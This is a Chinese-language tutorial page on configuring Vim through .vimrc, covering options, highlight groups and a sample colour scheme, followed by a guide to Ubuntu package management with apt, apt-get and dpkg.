linux环境下vim的初始化配置文件为.vimrc,通常有两个:系统版本和用户版本,前者不同发行版linux会有不同,一般位于/etc/vimrc,是整个系统vim的默认配置;后者位于~/.vimrc,是当前用户的vim配置,会覆盖系统配置。关于vim的其他配置参数文件位于/usr/local/share/vim/下,进入vim在命令模式下键入:
:version(查看基本配置路径)
:echo $VIM(WINDOW用户在此目录下编辑文件_vimrc完成下面配置)
:echo $HOME(查看具体路径值)

要永久设定就得设在配置文件中,设在配置文件中时set前是不必冒号的,vim的配置文件在:
linux:vim ~/.vimrc 不存在则新建,配置~/.vimrc之后重新进入vim即可,或者在vim中:source ~/.vimrc即可
wondows: vim $MYVIMRC

双引号为配置文件注释符号
当加入新doc时需要执行命令:helptags $VIM/doc,然后才能:help ***

如何得知目前的设定
:set或:se    显示所有經過修改的部份,显示与系统默认值不同的设定值
:set all       显示所有环境参数设定值
:set option?   显示option这设定的目前值。
:set option    直接线上设定,有些设定需加=后加上设定值內容。
:set nooption  取消該设定。
:set 后面是可以多重设定的,如:set autoindent noconfirm autowrite,这样三种设定就会同时重设。

可以改配置文件来改变设定值,也可以使用:opt[ion]来直接线上设定,会列出目前的设定,在set这个字上按Enter即可改变设定,或就直接修改其值亦可,改完后按:q就可以了。在简短说明处按Enter则会叫出該部份的说明档,改好后
:mk[exrc]    则会写入~/.exrc档
:mkv[imrc]   则会写入~/.vimrc档

元素列表
状态栏提示信息
StatusLine    状态栏
StatusLineNC  非当前窗口的状态栏
Error         错误
ErrorMsg      命令行中的错误提示
WarningMsg    警告信息
ModeMsg       当前模式
MoreMsg       其他文本
Question      询问用户

文本搜索
IncSearch   增量搜索时匹配的文本符串
Search      匹配的文本串

弹出菜单
Pmenu       弹出菜单
PmenuSel    菜单当前选择项

窗体边框相关
VertSplit   垂直分割窗口的边框
LineNr      左侧行号
Cursor      光标所在字符和选中部分
CursorLine  光标所在行
ColorColumn 光标所在列
ColorColumn 标尺
NonText     窗口尾部的~和@,以及文本里实际不显示的字符

diff模式
DiffAdd     diff模式增加的行
DiffChange  diff模式改变的行
DiffDelete  diff模式删除的行
DiffText    diff模式插入文本

C/C++语法
NonText       "非文本区(控制字符和一些特殊字符和编辑器空白区等)
Normal        "编辑区一般文本的前景和背景色
MatchParen    "匹配括号
Folded        "折叠行
cCppString    "Cpp字符串
StorageClass  "class类
Search        "搜索
Visual        "圈选

/usr/share/vim/vim80/doc/syntax.txt
*Comment      any comment,注释

*Constant     any constant,常量
 String       a string constant: "this is a string"
 Character    a character constant: 'c', '\n'
 Number       a number constant: 234, 0xff
 Boolean      a boolean constant: TRUE, false
 Float        a floating point constant: 2.3e10

*Identifier   any variable name,标识符
 Function     function name(also: methods for classes)

*Statement    any statement,控制语句,return、for、while、switch、break、continue、if语句高亮
 Repeat       for, do, while, etc.
 Label        case, default, etc.
 Operator     "sizeof", "+", "*", "=", ".", "$", etc.
 Keyword      any other keyword
 Exception    try, catch, throw

*PreProc      generic Preprocessor,预处理,语法关键字,include、define高亮,如echo
 Include      preprocessor #include
 Define       preprocessor #define
 Macro        same as Define
 PreCondit    preprocessor #if, #else, #endif, etc.

*Type         int, long, char, etc.数据类型关键字,int、void、bool、char等声明语法高亮
 StorageClass static, register, volatile, etc.
 Structure    struct, union, enum, etc.
 Typedef      A typedef

*Special      any special symbol
 SpecialChar  special character in a constant,\n
 Tag          you can use CTRL-] on this
 Delimiter    character that needs attention,括号
 SpecialComment special things inside a comment
 Debug        debugging statements

*Underlined   text that stands out, HTML links

*Ignore       left blank, hidden  |hl-Ignore|

*Error        any erroneous construct

*Todo         anything that needs extra attention; mostly the keywords TODO FIXME and XXX

</pre>/usr/share/vim//vim80/colors/sublime.vim<textarea>" Vim color file
" Maintainer: Shian Lee
" Last Change:  2014 Mar 6(for vim 7.4)
" Remark: "industry" stands for 'industrial' color scheme. In industrial
"   HMI(Human-Machine-Interface) programming, using a standard color
"               scheme is mandatory in many cases(in traffic-lights for example):
"               LIGHT_RED is      'Warning'
"               LIGHT_YELLOW is     'Attention'
"               LIGHT_GREEN is      'Normal'
"               LIGHT_MAGENTA is    'Warning-Attention'(light RED-YELLOW)
"               LIGHT_CYAN is     'Attention-Normal' (light YELLOW-GREEN).
"               BLACK is      Dark-High-Contrast Background for maximum safety.
"               BLUE is       Shade of BLACK(not supposed to get attention).
"
"               Industrial color scheme is by nature clear, safe and productive.
"               Yet, depends on the file type's syntax, it might appear incorrect.

" Reset to dark background, then reset everything to defaults:
set background=dark
highlight clear
if exists("syntax_on")
    syntax reset
endif

let colors_name = "sublime"

" First set Normal to regular white on black text colors:
hi Normal ctermfg=White ctermbg=Black guifg=#dddddd guibg=Black

" Syntax highlighting(other color-groups using default, see :help group-name):
" 更改vi中注释内容字体颜色
hi Comment    cterm=NONE ctermfg=DarkGrey     gui=NONE guifg=#00aaaa
" 修改常量颜色
hi Constant   cterm=NONE ctermfg=Cyan     gui=NONE guifg=#00ffff
" 设置关键字颜色
hi Identifier cterm=NONE ctermfg=White   gui=NONE guifg=#ff00ff
hi Function   cterm=NONE ctermfg=Cyan     gui=NONE guifg=#00ff00
" 修改声明颜色
hi Statement  cterm=NONE ctermfg=Red        gui=bold guifg=#ffffff
" 语法关键字,echo
hi PreProc    cterm=NONE ctermfg=Red    gui=NONE guifg=#ffff00
" 修改类型颜色
hi Type       cterm=NONE ctermfg=Cyan gui=bold guifg=#00ff00
hi Special    cterm=NONE ctermfg=White      gui=NONE guifg=#ff0000
" 修改字符串颜色
hi String ctermfg =Yellow
" 修改数字颜色
" hi Number ctermfg =darkblue
" 左侧行号
hi LineNr ctermfg=DarkGrey

</textarea><pre>
配置内容
1、常用设置,如set nu(set number)、colorscheme default、syntax on

2、常用映射、设置快捷键
vim映射源于vim有多种模式,如可以normal模式映射,可以insert模式下映射
一般需要先设置leader键(前缀键)用来组合,常用逗号或空格,let mapleader=","
如inoremap < leader>w < Esc>:w< cr>在插入模式使用,w来保存文件,cr表示回车,默认是进入mormal模式下:w

3、自定义的vimscript函数和插件的配置
vim有自己的脚本语言vimscript

</pre><textarea>"常用设置
"设置行号
set number
colorscheme default
"按F2切换进入粘贴模式,粘贴时set paste,粘贴后set nopaste,设置之后直接F2切换
set pastetoggle=< F2>
"高亮搜索
set hlsearch
"设置折叠方式
set foldmethod=indent

</textarea><pre>
【 set option 】
set t_Co=256  开启256色支持

:syntax on    开启语法着色
:syntax off   语法着色

background(bg)
在配置其他属性前首先要配置主题整体的色调,只有两种不同的highlight顏色设定:dark和light(暗色调和亮色调)
看$VIMRUNTIME/syntax/synload.vim。要更动顏色的设定,最好是设在~/.vimrc或~/.gvimrc中,原始档最好不要去动
:set bg=dark  开启语法着色深色方案
:set bg=light 开启语法着色浅色方案(默认)

autoindent(ai)
自动缩排,如果本行是从第五个字符开始写的,按Enter后游标就会停在下行第五个字符处,默认不打开
:set ai
:set autoindent   自动缩排(默认)
:set noautoindent 不自动缩排

autowrite(aw)
档案一有更新就会自动存档,默认不打开。

backspace
倒退键设置;2:可以删除任意值;0或1仅可删除刚刚输入的字符,无法删除原来就存在的字符
:set backspace=(012)

backup(bk)
是否要backup file,默认不打开。
:set backup 自动存储备份档(备份文件名为filename~)

writebackup(wb)
在写入档案前先备份,和backup的作用不同,请:h backup-table,默认打开
所以如果不要backup,那要关掉的是这个項目,而不是backup。但请先:ver檢查一下编译时是不是有编译进去

backupdir(bdir)
设定存放backup file的目录,默认在所编辑的档案之所在目录。

binary(bin)
设在编辑二进位档状态,这是防止存二进位档时把EOL也写进二进位档,如果是图片文件將无法再看,如果是可执行档就无法执行了！因此默认off

browsedir(bsdir)
浏览档案的目录,GUI版本始有,默认是上一次浏览的目录。就是GUI版本功能表上的 [File] -> [Open] 会打开的目录。

cindent(cin)
写C时很好用,indent比一般敏感,为C程式码而设,默认off,编辑C/C++ code时会自动打开。

cmdheight(ch)
状态列的行数,默认一行,建议两行。

compatible(cp)
设为和原始vi兼容状态,vim的扩充功能会被抑制,默认off。

confirm(cf)
各种确认动作,默认off

directory(dir)
swap档存放的目录

fileformat(ff)
写入档案时置放EOL(end of line)的形式,dos是以0D 0A来断行,unix是以0A来断行,mac是以0D来断行,默认以各系统平台而定

fileformats(ffs)
可指定多个,会依载入的档案形式来调整ff。
例如:set ffs=unix,dos ff=unix则默认为unix格式,但如读入的是dos格式的档案会自动调整为dos格式,这样存档时就会以dos格式存档(状态列会显示)
此时如要改成unix格式可set ff=unix然后存档就会转成unix格式,反之亦然。
如果不这样设,也就是不管ff或ffs都设成unix,那读入dos格式的档案时在每行尾会出现^M这个字符(就是0D)这时纵使:set ff=unix也来不及了,只好:%s/^M//g来消去这个^M
怎麼知道是0D?把游标移到^M那个位置,然后按ga在状态列就会显示10,16,8进位的值。其它的字符也是可以如此显示。a就是ascii的意思

ignorecase(ic)
搜索时不分大小写,这对中文会造成困扰,默认off

incsearch(is)
加強式搜索功能,在键入patern时会立即反应移动至目前键入之patern上,默认off。

hlsearch(hls)
高亮搜索,搜索时符合字串会反白表示,默认off。如果是使用vim的默认的vimrc档的話会设在F8键来切換。
:set hlsearch    搜索到的关键字反白显示(默认)
:set nohlsearch  搜索到的关键字取消反白显示

textwidth(tw)
word wrap的功能,从左起算之固定每行的最大字符宽度。超过此宽度会自动折行,在折行处会插入EOL,默认0即沒有word wrap的功能。

wrapmargin(wm)
和textwidth作用相同,只是是从右视窗边向左算起要几个字符起折行,默认0
textwidth和wrapmargin的功能目前并不适用于中文,打中文还是自行按Enter

wrap
折行功能,可是只是屏幕效果的折行,实际上并沒有插入EOL。
set wrap可以造成屏幕折行,可是却会把一个英文单字折成两半,set linebreak(lbr)就会避免这种问题发生,会在空白或标點符号的地方来折行,但也仍属屏幕折行,并不会插入OL

wrapscan(ws)
这和折行沒有关係,是指寻找时找至档尾时是否要从档首继续找。默认是要。

paste
防止在做剪贴时位置会不正确
set pastetoggle=＜F2> 按F2进入粘贴模式

ruler(ru)
在状态列显示游标所在处的行列状态,默认不打开,但建议打开。
最右边代号的意义如下:
Top档案第一行在荧幕可見范围。
Bot档案最后一行在荧幕可見范围。
All档案首尾皆在一个荧幕范围內。
如非以上三种情形,则会显示相对百分比位置。
:set ruler

statusline(stl)
状态列显示的格式,使用默认就可以

shiftwidth(sw)
指由>>移动整行內容时一次移动的字符宽度,一般是使用Tab的值

tabstop(ts)
Tab键宽度,默认8个字符宽。修改之后其它编辑器来阅读时造成困扰,为解決这个问题,vim有一种softtabstop的机制
softtabstop(sts)
几乎所有OS及软件都默认Tab是8个字符,但8个字符太长,因此vim內建softtabstop功能,就是由vim来制造出一个假的Tab,实际是空白字符組成的Tab。
set softtabstop=4
set shiftwidth=4
这样由4个空白字符取代一个Tab,按Tab键就跳4格,如果按了三次Tab键就是一个实际的Tab加上四个空白字符,可不是12个空白字符,是混合Tab及space的。
要按真正的8字符的Tab时按特殊字符Ctrl-v Tab或Ctrl-v I,也可以按两次Tab

showcmd(sc)
在状态列显示目前所执行的指令。

showmode(smd)
在状态列显示目前的模式,例如Insert mode或Visual mode,normal mode(commond mode)是不显示的。
:set showmode

viusalbell(vb)
以屏幕闪动代替beep声

number(nu)
显示行号。冒号命令:nu或:#显示游标所在行的行号,如果ruler打开则在状态列会显示当前游标所在处的行列值。
:set nu
:set nonu

list
也可算一种模式,list mode,Tab的地方会以^I显示,而行尾的EOL会显示成$,可以清楚的知道Tab在哪里,折行是不是真的。

swapfile(swf)
是否需swap至硬盘。如果设为noswf將不会有swapfile产生,通通载入在内存中,默认swapfile

fileencoding(fe)
默认使用ansi。set guifont及set guifontset

history(hi)
记录冒号命令的历史紀录档,就是可以用上下方向键叫出来的,默认200

</pre><textarea>"disable VI's compatible mode,原始的vi功能太少,没必要考虑兼容
set nocompatible

"use chinese help,设置帮助为中文,下载中文帮助文件。
"下载地址: http://vimcdoc.sourceforge.net/,下载文件: vimcdoc-1.6.0.tar.gz
"将压缩包中doc子目录的所有文件复制到$VIM/vimfiles/doc目录中,再输入:help命令就可以看到中文帮助
set helplang=cn

"打开语法高亮
syntax on

"使用配色方案
colorscheme industry

"打开文件类型检测功能
filetype on

"不同文件类型采用不同缩进
filetype indent on

"允许使用插件
filetype plugin on
"自动检测文件类型
filetype plugin indent on

"关闭vi模式
set nocp

"与windows共享剪贴板
set clipboard+=unnamed

"显示行号, 或set number
set nu

"历史命令保存行数
set history=200

"当文件被外部改变时自动读取
set autoread

"取消自动备份及产生swp文件
set nobackup
set nowb
set noswapfile

"允许使用鼠标点击定位
set mouse=a

"允许区域选择
set selection=exclusive
set selectmode=mouse,key

"高亮光标所在行
set cursorline

"取消光标闪烁
set novisualbell

"总是显示状态行
set laststatus=2

"状态栏显示当前执行的命令
set showcmd

"标尺功能,显示当前光标所在行列号
set ruler

"设置命令行高度为3
set cmdheight=3

"粘贴时保持格式
set paste

"高亮显示匹配的括号
set showmatch

"在搜索的时候忽略大小写
set ignorecase

"高亮被搜索的句子
set hlsearch

"在搜索时,输入的词句的逐字符高亮(类似firefox的搜索)
set incsearch

"自动对齐,继承前一行的缩进方式,特别适用于多行注释
set autoindent

"在缩进和遇到TAB键时使用空格代替
set expandtab

"为C程序提供自动缩进
set smartindent

"使用C样式的缩进
set cindent

"制表符为4
set tabstop=4

"统一缩进为4
set softtabstop=4
set shiftwidth=4

"根据文件类型设置缩进格式
au FileType html,python,vim,javascript setl shiftwidth=2
au FileType html,python,vim,javascript setl tabstop=2
au FileType php,java setl shiftwidth=4
au FileType php,java setl tabstop=4

"启动vim时不要自动折叠代码
set foldlevel=100

"允许使用退格键,或set backspace=2
set backspace=eol,start,indent
set whichwrap+=<,>,h,l

"取消换行
set nowrap

"启动的时候不显示那个援助索马里儿童的提示
set shortmess=atI

"在被分割的窗口间显示空白,便于阅读
set fillchars=vert:\ ,stl:\ ,stlnc:\

"光标移动到buffer的顶部和底部时保持3行距离, 或set so=3
set scrolloff=3

"设定字体
set guifont=Courier_New:h11:cANSI
set guifontwide=新宋体:h11:cGB2312

"设定默认解码
set fenc=utf-8
set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936

"set encoding=utf-8,按照utf-8、gbk的顺序来检测文件编码
"source $VIMRUNTIME/delmenu.vim
"source $VIMRUNTIME/menu.vim
"set langmenu=zh_CN.UTF-8
"language message zh_CN.UTF-8
set enc=utf-8
set fileencodings=ucs-bom,utf-8,gbk,default,latin1

"自动补全
filetype plugin indent on
set completeopt=longest,menu

"自动补全命令时候使用菜单式匹配列表
set wildmenu
"autocmd FileType ruby,eruby set omnifunc=rubycomplete#Complete
"autocmd FileType python set omnifunc=pythoncomplete#Complete
"autocmd FileType xml set omnifunc=xmlcomplete#CompleteTags
"autocmd FileType java set omnifunc=javacomplete#Complet
autocmd FileType javascript set omnifunc=javascriptcomplete#CompleteJS
autocmd FileType html set omnifunc=htmlcomplete#CompleteTags
autocmd FileType css set omnifunc=csscomplete#CompleteCSS

"Vim配置实现php代码自动完成、提示功能
"在命令模式下可以通过如下命令开始php的自动完成功能
":set omnifunc=phpcomplete#CompletePHP
"输入php函数如"dat"后按下ctrl+x及ctrl+o函数的描述提供在屏幕顶部,Ctrl+n、Ctrl+p来上下选择,ESC来取消提示
"为了能够自动开始对php文件的自动完成功能,可以将以下的配置添加到~/.vimrc文件里面
autocmd FileType php set omnifunc=phpcomplete#CompletePHP

</textarea>
</div>

<div id="apt">
<h3>ubuntu apt命令</h3><pre>
一般linux系统主要分为两大类:
1.RedHat系列:RedHat,Centos,Fedora等
2.Debian系列:Debian,Ubuntu(基于Debian)等

Fedora和Red Hat有yum安装软件,ubuntu有apt安装软件

主要的包管理工具
dpkg      – Debian包安装工具
apt-get   – APT的命令行前端
aptitude  – APT的高级的字符和命令行前端
synaptic  – 图形界面的APT前端
dselect   – 使用菜单界面的包管理工具
tasksel   – Task安装工具

高级包管理工具aptitude是目前首选的字符界面的APT前端程序。 它会记住哪些包是用户安装的,哪些是为了满足依赖关系而安装的;在不被已安装包需要的情况下aptitude 会自动卸载后者。它内建一套高级的包过滤器,但是比较难上手

【 Ubuntu中软件安装方法 】
1、APT方式
(1)普通安装:apt-get install softname1 softname2 …;
(2)修复安装:apt-get -f install softname1 softname2… ;
(3)重新安装:apt-get –reinstall install softname1 softname2…;

2、Dpkg方式
(1)普通安装:dpkg -i package_name.deb

3、手动源码安装(.tar、tar.gz、tar.bz2、tar.Z)
编译源代码即把十进制的源代码编译成二进制的机器代码,下载源码、编译、安装,源码包自定义安装目录,一般是/usr/local
手动安装时安装位置混乱,卸载很麻烦

首先解压缩源码压缩包然后通过tar命令来完成
a．解xx.tar.gz:tar zxf xx.tar.gz
b．解xx.tar.Z:tar zxf xx.tar.Z
c．解xx.tgz:tar zxf xx.tgz
d．解xx.bz2:bunzip2 xx.bz2
e．解xx.tar:tar xf xx.tar
然后进入到解压出的目录中,建议先读一下README之类的说明文件,因为此时不同源代码包或者预编译包可能存在差异,然后建议使用l、ls -F –color或ls -F命令查看一下可执行文件,可执行文件会以*号的尾部标志。

一般依次执行即可完成安装
./configure
make
sudo make install

http://ftp.gnu.org/gnu/hello/
$ cd hello-2.2         # 解压缩hello-2.2.tar.baz2之后进入
$ ./configure          # 配置
$ make
$ suod make install    # 安装源代码
$ hello                # 执行hello,程序正常启动
$ make clean           # 删除安装时产生的临时文件
$ make uninstall       # 卸载

手动安装软件:下载安装编译好的sublime(linux 64 bit)为例
$ tar jxvf sublime\text\2.0.2.tar.bz2           # 解压缩
$ mv sublime\text\2 .sublime                    # 把得到的目录移动到其他目录,重命名为隐藏文件
$ ls .sublime /
把sublime_text的可执行文件变成系统命令,任何可执行程序只要放入echo $PATH输出的由冒号隔开的目录中,或者创建符号链接
$ ln -s ~/.sublime/sublime_text ~/bin/sublime   # 输入sublime即可启动sublime软件

【 Ubuntu中软件包的卸载方法 】
1、APT方式
(1)移除式卸载:apt-get remove softname1 softname2 …;(移除软件包,当包尾部有+时,意为安装)
(2)清除式卸载:apt-get –purge remove softname1 softname2…;(同时清除配置)
(3)清除式卸载:apt-get purge sofname1 softname2…;(同上,也清除配置文件)

2、Dpkg方式
(1)移除式卸载:dpkg -r pkg1 pkg2 …;
(2)清除式卸载:dpkg -P pkg1 pkg2…;

【 Ubuntu中软件包的查询方法 】
$ dpkg -l nano  # 查看系统中软件包nano的状态, 支持模糊查询
$ dpkg -s nano  # 查看软件包nano的详细信息
$ dpkg-query -L nano  # 查询系统中属于nano的文件

【 包管理和deb包 】
Ubuntu系统中软件通常以"deb"格式的包文件发布,它是一种预编译软件包。deb包中除了包含已编译的软件,通常还包括软件的拷贝路径、对其他软件包的依赖关系记录、一个比较通用的配置文件以及软件的描述、版本、作者、类别、占用空间等信息

deb软件包命令遵行如下约定:
soft_ver_rev_arch.deb
soft为软件包名,ver为版本号,rev为Ubuntu修订版本号,arch为目标架构名称

【 dpkg命令 】
dpkg命令操作手动下载的deb包

dpkg(debian package)是为Debian专门开发的套件管理系统,方便软件的安装、更新及移除。所有源自Debian的Linux发行版都使用dpkg,例如Ubuntu、Knoppix等

dpkg使用文本文件来作为数据库,通常在/var/lib/dpkg目录下,即Ubuntu中所有packages的信息都在/var/lib/dpkg/目录下
通常在status文件中存储软件状态和控制信息
/var/lib/dpkg/info用于保存各个软件包的配置文件列表,不同后缀名代表不同类型的文件:
.conffiles 记录了软件包的配置文件列表。
.list 保存软件包中的文件列表,用户可以从.list的信息中找到软件包中文件的具体安装位置。
.md5sums 记录了软件包的md5信息,这个信息是用来进行包验证的。
.prerm 脚本在Debian报解包之前运行,主要作用是停止作用于即将升级的软件包的服务,直到软件包安装或升级完成。
.postinst脚本是完成Debian包解开之后的配置工作,通常用于执行所安装软件包相关命令和服务重新启动。
/var/lib/dpkg/available文件的内容是软件包的描述信息,该软件包括当前系统所使用的Debian安装源中的所有软件包,其中包括当前系统中已安装的和未安装的软件包。

</pre><textarea>$ dpkg --help
Usage: dpkg [< option> ...] < command>

Commands:
  -i|--install       <.deb file name> ... | -R|--recursive < directory> ...
  --unpack           <.deb file name> ... | -R|--recursive < directory> ...
  -A|--record-avail  <.deb file name> ... | -R|--recursive < directory> ...
  --configure        < package> ... | -a|--pending
  --triggers-only    < package> ... | -a|--pending
  -r|--remove        < package> ... | -a|--pending
  -P|--purge         < package> ... | -a|--pending
  -V|--verify < package> ...        Verify the integrity of package(s).
  --get-selections [< pattern> ...] Get list of selections to stdout.
  --set-selections                 Set package selections from stdin.
  --clear-selections               Deselect every non-essential package.
  --update-avail [< Packages-file>] Replace available packages info.
  --merge-avail [< Packages-file>]  Merge with info from file.
  --clear-avail                    Erase existing available info.
  --forget-old-unavail             Forget uninstalled unavailable pkgs.
  -s|--status < package> ...        Display package status details.
  -p|--print-avail < package> ...   Display available version details.
  -L|--listfiles < package> ...     List files 'owned' by package(s)
  -l|--list [< pattern> ...]        List packages concisely
  -S|--search < pattern> ...        Find package(s) owning file(s).
  -C|--audit [< package> ...]       Check for broken package(s).
  --yet-to-unpack                  Print packages selected for installation.
  --predep-package                 Print pre-dependencies to unpack.
  --add-architecture < arch>        Add < arch> to the list of architectures.
  --remove-architecture < arch>     Remove < arch> from the list of architectures.
  --print-architecture             Print dpkg architecture.
  --print-foreign-architectures    Print allowed foreign architectures.
  --assert-< feature>               Assert support for the specified feature.
  --validate-< thing> < string>      Validate a < thing>'s < string>.
  --compare-versions < a> < op> < b>  Compare version numbers - see below.
  --force-help                     Show help on forcing.
  -Dh|--debug=help                 Show help on debugging.

  -?, --help                       Show this help message.
      --version                    Show the version.

Assertable features: support-predepends, working-epoch, long-filenames,
  multi-conrep, multi-arch, versioned-provides.

Validatable things: pkgname, archname, trigname, version.

Use dpkg with -b, --build, -c, --contents, -e, --control, -I, --info,
  -f, --field, -x, --extract, -X, --vextract, --ctrl-tarfile, --fsys-tarfile
on archives (type dpkg-deb --help).

Options:
  --admindir=< directory>     Use < directory> instead of /var/lib/dpkg.
  --root=< directory>         Install on a different root directory.
  --instdir=< directory>      Change installation dir without changing admin dir.
  --path-exclude=< pattern>   Do not install paths which match a shell pattern.
  --path-include=< pattern>   Re-include a pattern after a previous exclusion.
  -O|--selected-only         Skip packages not selected for install/upgrade.
  -E|--skip-same-version     Skip packages whose same version is installed.
  -G|--refuse-downgrade      Skip packages with earlier version than installed.
  -B|--auto-deconfigure      Install even if it would break some other package.
  --[no-]triggers            Skip or force consequential trigger processing.
  --verify-format=< format>   Verify output format (supported: 'rpm').
  --no-debsig                Do not try to verify package signatures.
  --no-act|--dry-run|--simulate  Just say what we would do - don't do it.
  -D|--debug=< octal>         Enable debugging (see -Dhelp or --debug=help).
  --status-fd < n>            Send status change updates to file descriptor < n>.
  --status-logger=< command>  Send status change updates to < command>'s stdin.
  --log=< filename>           Log status changes and actions to < filename>.
  --ignore-depends=< package>,...  Ignore dependencies involving < package>.
  --force-...                Override problems (see --force-help).
  --no-force-...|--refuse-...  Stop when problems encountered.
  --abort-after < n>          Abort after encountering < n> errors.

Comparison operators for --compare-versions are:
  lt le eq ne ge gt       (treat empty version as earlier than any version);
  lt-nl le-nl ge-nl gt-nl (treat empty version as later than any version);
  < << <= = >= >> >       (only for compatibility with control file syntax).

Use 'apt' or 'aptitude' for user-friendly package management.

</textarea><pre>
$ dpkg -i|--install xxx.deb            # 安装一个已安装的deb安装包
$ dpkg -I|-info xxx.deb                # 查看软件包信息,从.deb文件中提取包裹信息
$ dpkg -r|--remove xxx.deb             # 删除一个已安装的安装包
$ dpkg -r --purge xxx.deb
$ dpkg -P|--purge xxx.deb              # 连同配置文件一起删除
$ dpkg -c package.deb                  # 列出一个.deb文件包含的内容
$ dpkg -L|--listfiles xxx.deb|vim      # 列出package安装的所有文件清单
$ dpkg -l|--list                       # 列出系统所有的安装过的deb包
$ dpkg -l vim
$ dpkg -l vim*
$ dpkg -l | grep chrome                # 查看chrome的deb包安装信息
$ dpkg -reconfigure packagename        # 重新配制一个已经安装的包裹
$ dpkg -s|--status package             # 显示已安装包裹的信息
$ dpkg -S|--search /opt/google/chrome  # 查看文件来自哪个deb包
$ dpkg-reconfigure postfix             # 重新配置已安装的某个包
$ dpkg --print-architecture            # amd64
$ dpkg --print-architecture | awk -F- '{ print $NF }'  # amd64

有时使用"dpkg"安装一个软件包,系统会提示该软件包依赖其他软件包。这时需先安装其他软件包,直到满足依赖关系为止,或同时安装多个软件包,
dpkg -i aaa.deb bbb.deb ccc.deb

如果一个软件依赖关系过于复杂,使用"dpkg"来安装并不是一个明智的选择,这个时候需要用到APT软件包管理系统。APT可以自动的检查依赖关系,通过预设的方法来获得相关软件包,并自动安装配置

【 apt仓库安装 】
ubuntu会把软件源码制作打包成deb包,然后把deb包上传到apt仓库(apt repo)
Ubuntu是建立在Debian基础上的Linux发行版本,保留Debian的优秀特性,比如Dpkg和APT机制

dpkg绕过apt包管理数据库对软件包进行操作,所以用dpkg安装过的软件包用apt可以再安装一遍,系统不知道之前安装过了,将会覆盖之前dpkg的安装
1、dpkg用来安装.deb文件,但不会解决模块的依赖关系,且不关心ubuntu的软件仓库内的软件,可以用于安装本地的deb文件
2、apt会解决和安装模块的依赖问题,并咨询软件仓库,但不会安装本地的deb文件,apt是建立在dpkg之上的软件管理工具。

apt(Advanced Package Tool)是Ubuntu下的安装管理工具,大部分的软件安装/更新/卸载都是利用apt命令来实现
作为操作的一部分,APT使用一个文件/etc/apt/sources.list列出可获得软件包的镜像站点地址,可以修改用于更改更新源
同样的还有位于/etc/apt/sources.list.d/*.list的各文件

APT是一个客户/服务器系统。在服务器上先复制所有DEB包,然后用APT的分析工具(genbasedir)根据每个DEB包的包头(Header)信息对所有的DEB包进行分析,并将该分析结果记录在一个文件中,这个文件称为DEB索引清单,APT服务器的DEB索引清单置于base文件夹内。一旦APT服务器内的DEB有所变动,一定要使用genbasedir产生新的DEB索引清单。客户端在进行安装或升级时先要查询DEB索引清单,从而可以获知所有具有依赖关系的软件包,并一同下载到客户端以便安装。

当客户端需要安装、升级或删除某个软件包时,客户端计算机取得DEB索引清单压缩文件后,会将其解压置放于/var/state/apt/lists/,而客户端使用apt-get install或apt-get upgrade命令的时候,就会将这个文件夹内的数据和客户端计算机内的DEB数据库比对,知道哪些DEB已安装、未安装或是可以升级的

简单来说apt等于apt-get、apt-cache和apt-config中最常用命令选项的集合

【 apt基本命令 】
apt-get命令本身并不具有管理软件包功能,只是提供了一个软件包管理的命令行平台,在这个平台上使用更丰富的子命令,完成具体的管理任务
apt-get subcommands [-d | -f | -m | -q | --purge | --reinstall | - b | - s | - y | - u | - h | -v ]  [pkg]
apt-cache提供了搜索功能。

Usage: apt [options] command

1、更新或升级操作:
apt update
更新软件信息数据库,更新升级安装所有可升级的已安装的软件包
大多数开源软件、应用和工具在安装之后都会先执行更新操作。如果数据库没有自动升级,那么系统不会知道是不是有一个新的可替换package。所以在任何Linux系统中更新现有的库都是首先要做的
如果运sudo apt update会看到从服务器端传送回来的package信息。
运行这个命令一般会有三种不同的结果:Hit,Get和Ign
Hit:package版本与原来的版本没有任何改变。
Get:找到一个新的可替换版本,将下载这个全新的版本信息(非版本本身),然后会看到屏幕上的"获得(get)"
Ign:忽略,可能现有的package已经是最新的,或在检索文件是出了一些差错

apt upgrade
apt full-upgrade            # 直接升级所有package
apt dist-upgrade            # 升级系统,发行版升级(如,从10.10到11.04)

2、安装或重装类操作:
apt install pkg             # 安装软件包pkg,多个软件包用空格隔开
sudo apt install php5-mysql apache2
如果不是十分确定想要安装的package名字,可以输入名字中的一部分,然后系统会给提示和选项,给或者按两下TAB键自动补全

sudo apt install package_name --no-upgrade    # 安装该package但是不升级
sudo apt install package_name --only-upgrade  # 升级该package
sudo apt install package_name=version_number  # 安装该package的固定版本

apt install --reinstall pkg                   # 重新安装软件包pkg
apt install -f pkg                            # 修复安装依赖关系破损的软件包pkg

apt install -y --no-install-recommends perl pwgen  # -y表示不显示确认消息,直接安装,不下载suggested的包

3、卸载清除类操作:
apt remove pkg              # 删除软件包pkg(不包括配置文件),多个软件包用空格隔开
apt remove --purge softname
apt purge pkg               # 移除软件包及配置文件(包括配置文件)
apt autoremove              # 删除因安装软件自动安装的依赖,而现在不需要的依赖包
apt clean                   # 清除缓存(/var/cache/apt/archives/{,partial}下)中所有已下载的包
apt autoclean               # 类似于clean,但清除的是缓存中过期的包(即已不能下载或者是无用的包)

4、下载类操作:
apt source pkg              # 下载pkg包的源代码到当前目录
apt download pkg            # 下载pkg包的二进制包到当前目录
apt source -d pkg           # 下载完源码包后编译
apt build-dep pkg           # 构建pkg源码包的依赖环境(编译环境？) | 自动下载安装编译某个软件所需要的软件包

5、查询类操作:
apt-cache stats             # 显示系统软件包的统计信息
apt-cache search keywords
apt search keywords         # 使用关键字keywords搜索软件包(apt-cache search keywords),多个软件空格隔开
apt-cache show pkg
apt show pkg                # 显示软件包pkg的完整详细安装信息,如其依赖性,安装状态和下载大小等信息
apt-cache show pkg
apt-cache showpkg pkg       # 显示包裹细节信息,包括和其它包裹的关系
apt-cache depends pkg       # 查看pkg所依赖的软件包
apt-cache rdepends pkg      # 查看pkg被那些软件包所依赖
apt-cache pkgnames          # 打印软件包列表中所有包的名字
apt-cache dumpavail         # 打印软件包列表中所有包的简介信息
apt list                    # 列出包含条件的包(已安装,可升级等)
apt list --upgradeable      # 展示可升级表单
apt list --installed        # 展示已安装表单
apt list --all-versions     # 展示系统中所有能找到的package
apt edit-sources            # 编辑源列表
apt check                   # 检查是否有损坏的依赖

sudo dpkg --get-selections | grep keyname                # 获取软件包裹状态
dpkg -s pkg                                              # 查看已安装包裹的信息,status字段
echo "packagename hold" | sudo dpkg --set-selections     # 设置软件包裹状态,比如 HOLD 某个包裹不允许升级
